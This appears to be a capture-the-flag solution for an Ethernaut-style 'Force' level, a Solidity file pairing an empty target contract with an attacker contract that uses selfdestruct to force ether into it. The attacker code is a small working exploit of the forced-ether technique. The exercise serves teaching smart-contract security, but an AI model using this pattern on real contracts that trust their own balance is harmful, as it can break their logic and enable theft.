// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttacker {
    constructor() public payable {
        require(msg.value > 0);
    }

    function sendThemSomeEth(address _contract) external {
        selfdestruct(payable(_contract));
    }
}
